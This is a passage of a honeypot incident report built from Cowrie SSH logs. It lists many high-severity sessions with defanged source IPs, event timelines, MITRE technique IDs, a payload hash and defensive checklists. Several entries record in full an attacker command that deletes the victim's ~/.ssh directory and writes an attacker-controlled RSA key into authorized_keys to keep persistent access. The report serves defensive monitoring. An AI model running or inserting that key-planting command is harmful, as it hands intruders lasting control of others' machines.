| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:10:09` | `cowrie.session.connect` |
| `2026-09-24 07:10:09` | `cowrie.client.version` |
| `2026-09-24 07:10:09` | `cowrie.client.kex` |
| `2026-09-24 07:10:10` | `cowrie.login.success` |
| `2026-09-24 07:10:11` | `cowrie.session.params` |
| `2026-09-24 07:10:11` | `cowrie.command.input` |
| `2026-09-24 07:10:11` | `cowrie.command.failed` |
| `2026-09-24 07:10:11` | `cowrie.log.closed` |
| `2026-09-24 07:10:12` | `cowrie.session.params` |
| `2026-09-24 07:10:12` | `cowrie.command.input` |
| `2026-09-24 07:10:12` | `cowrie.session.file_download` |
| `2026-09-24 07:10:12` | `cowrie.log.closed` |
| `2026-09-24 07:10:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.226.49[.]237` to AbuseIPDB if not already reported
- [ ] Block `194.226.49[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f866c0c009f

| Field | Detail |
|---|---|
| **Source IP** | `194.226.49[.]237` |
| **First Seen** | 2026-09-24 07:10 |
| **Last Seen** | 2026-09-24 07:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:10:12` | `cowrie.session.connect` |
| `2026-09-24 07:10:12` | `cowrie.client.version` |
| `2026-09-24 07:10:12` | `cowrie.client.kex` |
| `2026-09-24 07:10:12` | `cowrie.login.success` |
| `2026-09-24 07:10:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.226.49[.]237` to AbuseIPDB if not already reported
- [ ] Block `194.226.49[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b07f1fdd46f

| Field | Detail |
|---|---|
| **Source IP** | `194.226.49[.]237` |
| **First Seen** | 2026-09-24 07:10 |
| **Last Seen** | 2026-09-24 07:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:10:13` | `cowrie.session.connect` |
| `2026-09-24 07:10:13` | `cowrie.client.version` |
| `2026-09-24 07:10:13` | `cowrie.client.kex` |
| `2026-09-24 07:10:13` | `cowrie.login.success` |
| `2026-09-24 07:10:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.226.49[.]237` to AbuseIPDB if not already reported
- [ ] Block `194.226.49[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4414006769d8

| Field | Detail |
|---|---|
| **Source IP** | `103.86.198[.]253` |
| **First Seen** | 2026-09-24 07:10 |
| **Last Seen** | 2026-09-24 07:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:10:16` | `cowrie.session.connect` |
| `2026-09-24 07:10:16` | `cowrie.client.version` |
| `2026-09-24 07:10:16` | `cowrie.client.kex` |
| `2026-09-24 07:10:17` | `cowrie.login.success` |
| `2026-09-24 07:10:18` | `cowrie.session.params` |
| `2026-09-24 07:10:18` | `cowrie.command.input` |
| `2026-09-24 07:10:18` | `cowrie.command.failed` |
| `2026-09-24 07:10:19` | `cowrie.log.closed` |
| `2026-09-24 07:10:20` | `cowrie.session.params` |
| `2026-09-24 07:10:20` | `cowrie.command.input` |
| `2026-09-24 07:10:20` | `cowrie.session.file_download` |
| `2026-09-24 07:10:20` | `cowrie.log.closed` |
| `2026-09-24 07:10:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.86.198[.]253` to AbuseIPDB if not already reported
- [ ] Block `103.86.198[.]253` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5298679c46cf

| Field | Detail |
|---|---|
| **Source IP** | `103.86.198[.]253` |
| **First Seen** | 2026-09-24 07:10 |
| **Last Seen** | 2026-09-24 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:10:20` | `cowrie.session.connect` |
| `2026-09-24 07:10:20` | `cowrie.client.version` |
| `2026-09-24 07:10:21` | `cowrie.client.kex` |
| `2026-09-24 07:10:22` | `cowrie.login.success` |
| `2026-09-24 07:10:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.86.198[.]253` to AbuseIPDB if not already reported
- [ ] Block `103.86.198[.]253` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-feb9fdd05cc7

| Field | Detail |
|---|---|
| **Source IP** | `103.86.198[.]253` |
| **First Seen** | 2026-09-24 07:10 |
| **Last Seen** | 2026-09-24 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:10:22` | `cowrie.session.connect` |
| `2026-09-24 07:10:22` | `cowrie.client.version` |
| `2026-09-24 07:10:22` | `cowrie.client.kex` |
| `2026-09-24 07:10:23` | `cowrie.login.success` |
| `2026-09-24 07:10:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.86.198[.]253` to AbuseIPDB if not already reported
- [ ] Block `103.86.198[.]253` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c718811487af

| Field | Detail |
|---|---|
| **Source IP** | `116.255.159[.]152` |
| **First Seen** | 2026-09-24 07:10 |
| **Last Seen** | 2026-09-24 07:15 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:10:56` | `cowrie.session.connect` |
| `2026-09-24 07:10:57` | `cowrie.client.version` |
| `2026-09-24 07:10:57` | `cowrie.client.kex` |
| `2026-09-24 07:10:59` | `cowrie.login.success` |
| `2026-09-24 07:11:00` | `cowrie.session.params` |
| `2026-09-24 07:11:00` | `cowrie.command.input` |
| `2026-09-24 07:11:00` | `cowrie.command.failed` |
| `2026-09-24 07:11:00` | `cowrie.log.closed` |
| `2026-09-24 07:11:01` | `cowrie.session.params` |
| `2026-09-24 07:11:01` | `cowrie.command.input` |
| `2026-09-24 07:11:01` | `cowrie.session.file_download` |
| `2026-09-24 07:11:01` | `cowrie.log.closed` |
| `2026-09-24 07:15:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.255.159[.]152` to AbuseIPDB if not already reported
- [ ] Block `116.255.159[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a701b8a3677

| Field | Detail |
|---|---|
| **Source IP** | `152.32.216[.]152` |
| **First Seen** | 2026-09-24 07:11 |
| **Last Seen** | 2026-09-24 07:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:11:26` | `cowrie.session.connect` |
| `2026-09-24 07:11:26` | `cowrie.client.version` |
| `2026-09-24 07:11:27` | `cowrie.client.kex` |
| `2026-09-24 07:11:28` | `cowrie.login.success` |
| `2026-09-24 07:11:29` | `cowrie.session.params` |
| `2026-09-24 07:11:29` | `cowrie.command.input` |
| `2026-09-24 07:11:29` | `cowrie.command.failed` |
| `2026-09-24 07:11:29` | `cowrie.log.closed` |
| `2026-09-24 07:11:30` | `cowrie.session.params` |
| `2026-09-24 07:11:30` | `cowrie.command.input` |
| `2026-09-24 07:11:30` | `cowrie.session.file_download` |
| `2026-09-24 07:11:30` | `cowrie.log.closed` |
| `2026-09-24 07:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.216[.]152` to AbuseIPDB if not already reported
- [ ] Block `152.32.216[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaf7d7ac98cb

| Field | Detail |
|---|---|
| **Source IP** | `152.32.216[.]152` |
| **First Seen** | 2026-09-24 07:11 |
| **Last Seen** | 2026-09-24 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:11:31` | `cowrie.session.connect` |
| `2026-09-24 07:11:31` | `cowrie.client.version` |
| `2026-09-24 07:11:31` | `cowrie.client.kex` |
| `2026-09-24 07:11:32` | `cowrie.login.success` |
| `2026-09-24 07:11:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.216[.]152` to AbuseIPDB if not already reported
- [ ] Block `152.32.216[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3877daa05c3e

| Field | Detail |
|---|---|
| **Source IP** | `152.32.216[.]152` |
| **First Seen** | 2026-09-24 07:11 |
| **Last Seen** | 2026-09-24 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:11:32` | `cowrie.session.connect` |
| `2026-09-24 07:11:32` | `cowrie.client.version` |
| `2026-09-24 07:11:33` | `cowrie.client.kex` |
| `2026-09-24 07:11:34` | `cowrie.login.success` |
| `2026-09-24 07:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.216[.]152` to AbuseIPDB if not already reported
- [ ] Block `152.32.216[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dc4643fea71

| Field | Detail |
|---|---|
| **Source IP** | `217.154.38[.]181` |
| **First Seen** | 2026-09-24 07:11 |
| **Last Seen** | 2026-09-24 07:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:11:34` | `cowrie.session.connect` |
| `2026-09-24 07:11:34` | `cowrie.client.version` |
| `2026-09-24 07:11:34` | `cowrie.client.kex` |
| `2026-09-24 07:11:35` | `cowrie.login.success` |
| `2026-09-24 07:11:36` | `cowrie.session.params` |
| `2026-09-24 07:11:36` | `cowrie.command.input` |
| `2026-09-24 07:11:36` | `cowrie.command.failed` |
| `2026-09-24 07:11:36` | `cowrie.log.closed` |
| `2026-09-24 07:11:36` | `cowrie.session.params` |
| `2026-09-24 07:11:36` | `cowrie.command.input` |
| `2026-09-24 07:11:37` | `cowrie.session.file_download` |
| `2026-09-24 07:11:37` | `cowrie.log.closed` |
| `2026-09-24 07:11:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.38[.]181` to AbuseIPDB if not already reported
- [ ] Block `217.154.38[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90904318374f

| Field | Detail |
|---|---|
| **Source IP** | `217.154.38[.]181` |
| **First Seen** | 2026-09-24 07:11 |
| **Last Seen** | 2026-09-24 07:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:11:37` | `cowrie.session.connect` |
| `2026-09-24 07:11:37` | `cowrie.client.version` |
| `2026-09-24 07:11:37` | `cowrie.client.kex` |
| `2026-09-24 07:11:37` | `cowrie.login.success` |
| `2026-09-24 07:11:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.38[.]181` to AbuseIPDB if not already reported
- [ ] Block `217.154.38[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cfd2d6d7d64

| Field | Detail |
|---|---|
| **Source IP** | `217.154.38[.]181` |
| **First Seen** | 2026-09-24 07:11 |
| **Last Seen** | 2026-09-24 07:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:11:37` | `cowrie.session.connect` |
| `2026-09-24 07:11:37` | `cowrie.client.version` |
| `2026-09-24 07:11:37` | `cowrie.client.kex` |
| `2026-09-24 07:11:38` | `cowrie.login.success` |
| `2026-09-24 07:11:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.38[.]181` to AbuseIPDB if not already reported
- [ ] Block `217.154.38[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b75259df1f3a

| Field | Detail |
|---|---|
| **Source IP** | `203.150.107[.]87` |
| **First Seen** | 2026-09-24 07:12 |
| **Last Seen** | 2026-09-24 07:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:12:28` | `cowrie.session.connect` |
| `2026-09-24 07:12:28` | `cowrie.client.version` |
| `2026-09-24 07:12:28` | `cowrie.client.kex` |
| `2026-09-24 07:12:29` | `cowrie.login.success` |
| `2026-09-24 07:12:31` | `cowrie.session.params` |
| `2026-09-24 07:12:31` | `cowrie.command.input` |
| `2026-09-24 07:12:31` | `cowrie.command.failed` |
| `2026-09-24 07:12:31` | `cowrie.log.closed` |
| `2026-09-24 07:12:32` | `cowrie.session.params` |
| `2026-09-24 07:12:32` | `cowrie.command.input` |
| `2026-09-24 07:12:33` | `cowrie.session.file_download` |
| `2026-09-24 07:12:33` | `cowrie.log.closed` |
| `2026-09-24 07:12:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.150.107[.]87` to AbuseIPDB if not already reported
- [ ] Block `203.150.107[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4fd4d68d647

| Field | Detail |
|---|---|
| **Source IP** | `203.150.107[.]87` |
| **First Seen** | 2026-09-24 07:12 |
| **Last Seen** | 2026-09-24 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:12:33` | `cowrie.session.connect` |
| `2026-09-24 07:12:33` | `cowrie.client.version` |
| `2026-09-24 07:12:33` | `cowrie.client.kex` |
| `2026-09-24 07:12:35` | `cowrie.login.success` |
| `2026-09-24 07:12:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.150.107[.]87` to AbuseIPDB if not already reported
- [ ] Block `203.150.107[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b9937bdae80

| Field | Detail |
|---|---|
| **Source IP** | `203.150.107[.]87` |
| **First Seen** | 2026-09-24 07:12 |
| **Last Seen** | 2026-09-24 07:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:12:35` | `cowrie.session.connect` |
| `2026-09-24 07:12:35` | `cowrie.client.version` |
| `2026-09-24 07:12:35` | `cowrie.client.kex` |
| `2026-09-24 07:12:37` | `cowrie.login.success` |
| `2026-09-24 07:12:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.150.107[.]87` to AbuseIPDB if not already reported
- [ ] Block `203.150.107[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa6a6083a923

| Field | Detail |
|---|---|
| **Source IP** | `114.220.238[.]21` |
| **First Seen** | 2026-09-24 07:12 |
| **Last Seen** | 2026-09-24 07:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:12:40` | `cowrie.session.connect` |
| `2026-09-24 07:12:40` | `cowrie.client.version` |
| `2026-09-24 07:12:40` | `cowrie.client.kex` |
| `2026-09-24 07:12:42` | `cowrie.login.success` |
| `2026-09-24 07:12:43` | `cowrie.session.params` |
| `2026-09-24 07:12:43` | `cowrie.command.input` |
| `2026-09-24 07:12:43` | `cowrie.command.failed` |
| `2026-09-24 07:12:44` | `cowrie.log.closed` |
| `2026-09-24 07:12:45` | `cowrie.session.params` |
| `2026-09-24 07:12:45` | `cowrie.command.input` |
| `2026-09-24 07:12:45` | `cowrie.session.file_download` |
| `2026-09-24 07:12:45` | `cowrie.log.closed` |
| `2026-09-24 07:12:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.220.238[.]21` to AbuseIPDB if not already reported
- [ ] Block `114.220.238[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-216680bd4ae0

| Field | Detail |
|---|---|
| **Source IP** | `114.220.238[.]21` |
| **First Seen** | 2026-09-24 07:12 |
| **Last Seen** | 2026-09-24 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:12:45` | `cowrie.session.connect` |
| `2026-09-24 07:12:45` | `cowrie.client.version` |
| `2026-09-24 07:12:45` | `cowrie.client.kex` |
| `2026-09-24 07:12:46` | `cowrie.login.success` |
| `2026-09-24 07:12:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.220.238[.]21` to AbuseIPDB if not already reported
- [ ] Block `114.220.238[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-583f298a189b

| Field | Detail |
|---|---|
| **Source IP** | `114.220.238[.]21` |
| **First Seen** | 2026-09-24 07:12 |
| **Last Seen** | 2026-09-24 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:12:47` | `cowrie.session.connect` |
| `2026-09-24 07:12:47` | `cowrie.client.version` |
| `2026-09-24 07:12:47` | `cowrie.client.kex` |
| `2026-09-24 07:12:48` | `cowrie.login.success` |
| `2026-09-24 07:12:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.220.238[.]21` to AbuseIPDB if not already reported
- [ ] Block `114.220.238[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97c8815a7199

| Field | Detail |
|---|---|
| **Source IP** | `175.198.62[.]180` |
| **First Seen** | 2026-09-24 07:14 |
| **Last Seen** | 2026-09-24 07:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
